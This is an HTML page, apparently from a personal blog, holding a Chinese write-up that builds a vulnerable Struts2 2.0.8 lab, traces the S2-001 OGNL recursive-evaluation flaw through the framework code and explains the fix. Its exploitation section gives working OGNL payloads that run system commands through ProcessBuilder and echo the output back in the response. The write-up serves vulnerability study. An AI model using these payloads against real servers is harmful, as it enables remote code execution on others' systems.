@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Java反序列化之 structS2-001环境搭建(新版idea)和漏洞复现 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Java反序列化之 structS2-001环境搭建(新版idea)和漏洞复现</h1>
+    <div class="post-meta">
+      <time datetime="2025-07-22">2025-07-22</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18998803">https://www.cnblogs.com/Zephyr07/articles/18998803</a></p>
+</blockquote>
+<h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>idea新建项目-&gt;maven-archetype-&gt;选择<strong>org.apache.maven.archetypes:maven-archetype-webapp-&gt;创建</strong></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250724094243605-844975770.png"></p>
+<p>创建后要等几秒种等待加载好目录</p>
+<p>pom.xml导入依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.0.8&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>web.xml配置<code>struts2</code>的过滤器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;S2-001 Example&lt;/display-name&gt;</span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line">  &lt;welcome-file-list&gt;</span><br><span class="line">    &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;</span><br><span class="line">  &lt;/welcome-file-list&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后在main下添加java源目录</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152530041-1533882311.png" alt="image"></p>
+<p>然后在java目录下创建<strong>类</strong>com.test.s2001.action.LoginAction</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152537512-530520347.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.test.s2001.action;</span><br><span class="line"></span><br><span class="line">import com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line">public class LoginAction extends ActionSupport&#123;</span><br><span class="line">    private String username = null;</span><br><span class="line">    private String password = null;</span><br><span class="line"></span><br><span class="line">    public String getUsername() &#123;</span><br><span class="line">        return this.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPassword() &#123;</span><br><span class="line">        return this.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUsername(String username) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPassword(String password) &#123;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String execute() throws Exception &#123;</span><br><span class="line">        if ((this.username.isEmpty()) || (this.password.isEmpty())) &#123;</span><br><span class="line">            return &quot;error&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if ((this.username.equalsIgnoreCase(&quot;admin&quot;))</span><br><span class="line">                &amp;&amp; (this.password.equals(&quot;admin&quot;))) &#123;</span><br><span class="line">            return &quot;success&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改webapp目录下的index.jsp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">         pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;s:form action=&quot;login&quot;&gt;</span><br><span class="line">    &lt;s:textfield name=&quot;username&quot; label=&quot;username&quot; /&gt;</span><br><span class="line">    &lt;s:textfield name=&quot;password&quot; label=&quot;password&quot; /&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>webapp目录下新建welcome.jsp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">         pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value=&quot;username&quot;&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>main目录下创建一个<code>resources</code> 文件夹，内部添加一个 <code>struts.xml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span><br><span class="line">        &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;package name=&quot;S2-001&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">        &lt;action name=&quot;login&quot; class=&quot;com.test.s2001.action.LoginAction&quot;&gt;</span><br><span class="line">            &lt;result name=&quot;success&quot;&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">            &lt;result name=&quot;error&quot;&gt;index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;/action&gt;</span><br><span class="line">    &lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后就是配置一个tomcat环境</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152547866-755720599.png" alt="image"></p>
+<p>然后记得要部署工件，下方会有自动提示，点<strong>修复</strong>即可</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152554343-259594592.png" alt="image"></p>
+<p>这样整个配置流程就结束了，然后运行tomcat看一下效果</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152604988-1783113530.png" alt="image"></p>
+<p>submit</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152610180-1145542257.png" alt="image"></p>
+<h1 id="OGNL表达式基础"><a href="#OGNL表达式基础" class="headerlink" title="OGNL表达式基础"></a>OGNL表达式基础</h1><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>WebWork 2.1 (with altSyntax enabled)</p>
+<p>WebWork 2.2.0 - WebWork 2.2.5</p>
+<p>Struts 2.0.0 - Struts 2.0.8</p>
+<p>Struts2 对 OGNL 表达式的解析使用了开源组件 <code>opensymphony.xwork 2.0.3</code> 所以会有漏洞</p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>先说一下Struts2 的执行流程</p>
+<ol>
+<li>首先就是我们在配置web.xml的时候是设置了一个filter过滤器，并且还配置<code>/*</code> 全部的路由，这里全部路由就是交给 struts2 来处理</li>
+<li>Interceptor-stack：执行拦截器，应用程序通常会在拦截器中实现一部分功能。也包括在 struts-core 包中 <code>struts-default.xml</code> 文件配置的默认的一些拦截器。</li>
+<li>配置Action：根据访问路径，找到处理这个请求对应的 Action 控制类，通常配置在 <code>struts.xml</code> 中的 package 中</li>
+<li>最后由 Action 控制类执行请求的处理，执行结果可能是视图文件，可能是去访问另一个 Action，结果通过 HTTPServletResponse 响应</li>
+</ol>
+<p>在我们配置的filter过滤器中的dofilter主要做了以下业务：</p>
+<ul>
+<li>设置编码和本地化信息</li>
+<li>创建 ActionContext 对象</li>
+<li>分配当前线程的分发器</li>
+<li>将request对象进行封装</li>
+<li>获取 ActionMapping 对象, ActionMapping 对象对应一个action详细配置信息</li>
+<li>执行 Action 请求, 也就是 <code>serviceAction()</code> 方法</li>
+</ul>
+<p>所以我们跟进FilterDispatcher中在dofilter处下个断点</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152621672-1871724817.png" alt="image"></p>
+<p>然后我们一直下一步，下一步直到看到<code>serviceAction()</code> 方法(中间的过程就是一些判断和赋值，不是重点)</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152629062-1162483381.png" alt="image"></p>
+<p>然后我们跟进serviceAction方法中，分析一下这段代码</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152639777-434408165.png" alt="image"></p>
+<p>首先就是获取当前请求是否已经有ValueStack 对象，这样是为了在接收到chain跳转方式的请求时候，可以直接接管上次请求的action。</p>
+<p>如果没有ValueStack 对象的话，就获取当前线程中的ActionContext对象；如果有 ValueStack 对象，将事先处理好的请求中的参数 put 到 ValueStack 中，接着获取 ActionMapping 中配置的 namespace, name, method 值</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152648442-1085536916.png" alt="image"></p>
+<p>继续获取到namespace, name, method 值之后，ActionProxyFactory 的 <code>createActionProxy()</code>方法初始化了一个actionproxy，同时也创建了<code>StrutsActionProxy</code> 的实例，它是继承自<code>com.opensymphony.xwork2.DefaultActionProxy</code> 的, 在这个代理对象内部实际上就持有了<code>DefaultActionInvocation</code> 的一个实例</p>
+<p>DefaultActionInvocation 对象中保存了 Action 调用过程中需要的一切信息</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152655767-240057030.png" alt="image"></p>
+<p>然后我们继续跟，发现到了proxy.execute()方法中去，发现就是获取了一下上下文，并且用setter方法赋值上下文</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152702247-228983996.png" alt="image"></p>
+<p>我们继续跟到invoke中去</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152711829-265522428.png" alt="image"></p>
+<p>在invoke方法中，首先会使用迭代器顺序的递归执行当前action中配置的所有拦截器，一直持续到拦截器全都遍历完之后调用真正的action，这里的迭代器是struts2 包内的 struts-default.xml 里面的 <code>interceptors</code> 标签中的内容</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152739512-588449327.png" alt="image"></p>
+<p>而在这么多迭代器中有有一个param迭代器是用来处理我们输入的参数的，看到这里就想到这里会不会就有OGNL表达式的处理，因为该漏洞的本质就是OGNL</p>
+<p>表达式的调用</p>
+<p>在所有迭代器都执行完之后，就到了<code>invokeActionOnly</code>方法中，跟进去看一下，发现调用了<code>invokeAction</code>方法，我们跟进去</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152751026-322909022.png" alt="image"></p>
+<p>发现通过反射调用执行了action实现类里的execute方法，开始处理用户的逻辑信息</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152758091-254482853.png" alt="image"></p>
+<p>现在回到invoke方法中，invokeActionOnly之后，然后我们跟到executeResult()中去</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152809825-1475741164.png" alt="image"></p>
+<p>看代码。首先就是createResult()创建了一个result对象，后面会去判断result是否为空，不为空的话去执行execute(从图片中也可以看出result不为空),所以跟进execute</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152819140-1837518595.png" alt="image"></p>
+<p>execute中还有个doExecute()，继续跟进</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152825652-61290854.png" alt="image"></p>
+<p>看代码，首先准备执行环境，request, pageContext 等之后，会发送真正的响应信息，这时候我们调试发现返回的结果是jsp文件</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807152836571-1994629175.png" alt="image"></p>
+<p>下面的调试是无法在上面的过程中跟入的，需要自己找到ComponentTagSupport包，然后下断点调试</p>
+<p>然后的话就会调用jspservlet来处理请求，当在解析标签的时候，会分别对标签的开始和结束位置调用<code>org.apache.struts2.views.jsp.ComponentTagSupport</code> 中的 <code>doStartTag()</code>（一些初始化操作) 及 <code>doEndTag()</code> （标签解析后调用end方法)方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250807153229213-401192270.png" alt="image"></p>
+<p>而在doendtag方法中的end方法就是我们今天的主角，也就是漏洞触发的地方，我们跟进去，在跟进<code>evaluateParams()</code> 方法中去</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753165449205-248d45c5-c4cf-4705-9930-9c235c93adab.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753165470328-e6168c90-f1d1-4de8-bc6d-3d93875b719b.png"></p>
+<p>然后在这个方法中往下找到altSyntax参数(大概在305行左右，根据个人情况而定)，这里由于altSyntax是默认开启的，所以代码会跳到addParameter处执行findvalue方法寻找参数值</p>
+<p>在此处我们也可以看到expr参数就是会将username拼接到%{}中去，本来这样如果我们输入恶意payload：%{2*2}是无法被解析的，问题就出在后面的处理</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753165589217-e800d666-e3f9-4765-b564-cca892c6e3fa.png"></p>
+<p>我们跟到findvalue中，再跟到translateVariables中去</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753165787344-2eb27176-e55b-46e7-8038-b7b71cdb0d35.png"></p>
+<p>我们往下面看，会发现此处会将expr参数首尾的{和}去掉赋值给var参数，然后紧接着就是findvalue将获取到的username参数(也就是我们上方的%{2*2})赋值给o，然后会再次赋值给expression，这时检测到还是ognl表达式，就会再一次进入循环，这时候的结果就是4，并再次赋值o-&gt;expression，这时候检测到不是ognl表达式就不会进入循环，最终造成了s2-001漏洞</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753166294990-b67fec2b-585f-4ad6-8317-523ecbc743a1.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cmd&quot;,&quot;-c&quot;,&quot;clac&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44318133/1753167201978-ce6645e4-c4e1-4ae8-9d58-9114f1ac9359.png"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方给出的漏洞修复就是多了一段判断循环次数的代码，从而在解析到 <code>%{1+1}</code> 的</p>
+<p>时候不会继续向下递归</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) &#123;</span><br><span class="line">    // deal with the &quot;pure&quot; expressions first!</span><br><span class="line">    //expression = expression.trim();</span><br><span class="line">    Object result = expression;</span><br><span class="line">    int loopCount = 1;</span><br><span class="line">    int pos = 0;</span><br><span class="line">    while (true) &#123;</span><br><span class="line"></span><br><span class="line">        int start = expression.indexOf(open + &quot;&#123;&quot;, pos);</span><br><span class="line">        if (start == -1) &#123;</span><br><span class="line">            pos = 0;</span><br><span class="line">            loopCount++;</span><br><span class="line">            start = expression.indexOf(open + &quot;&#123;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //修复处</span><br><span class="line">        if (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            // translateVariables prevent infinite loop / expression recursive evaluation</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        int length = expression.length();</span><br><span class="line">        int x = start + 2;</span><br><span class="line">        int end;</span><br><span class="line">        char c;</span><br><span class="line">        int count = 1;</span><br><span class="line">        while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            if (c == &#x27;&#123;&#x27;) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; else if (c == &#x27;&#125;&#x27;) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - 1;</span><br><span class="line"></span><br><span class="line">        if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123;</span><br><span class="line">            String var = expression.substring(start + 2, end);</span><br><span class="line"></span><br><span class="line">            Object o = stack.findValue(var, asType);</span><br><span class="line">            if (evaluator != null) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String left = expression.substring(0, start);</span><br><span class="line">            String right = expression.substring(end + 1);</span><br><span class="line">            String middle = null;</span><br><span class="line">            if (o != null) &#123;</span><br><span class="line">                middle = o.toString();</span><br><span class="line">                if (!TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    result = left + middle;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + middle + right;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // the variable doesn&#x27;t exist, so don&#x27;t display anything</span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">            pos = (left != null &amp;&amp; left.length() &gt; 0 ? left.length() - 1: 0) +</span><br><span class="line">                  (middle != null &amp;&amp; middle.length() &gt; 0 ? middle.length() - 1: 0) +</span><br><span class="line">                  1;</span><br><span class="line">            pos = Math.max(pos, 1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#0x01-%E5%89%8D%E8%A8%80">https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#0x01-%E5%89%8D%E8%A8%80</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/02/Java-Struts2-%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#0x04-OGNL-%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://drun1baby.top/2022/11/02/Java-Struts2-%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#0x04-OGNL-%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/07/23/Java%E5%AE%89%E5%85%A8%E4%B9%8BFreeMarker-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="prev">← Java安全之FreeMarker 模板注入</a>
+    
+    
+      <a href="/2025/07/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/" class="next">java反序列化之ROME链 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
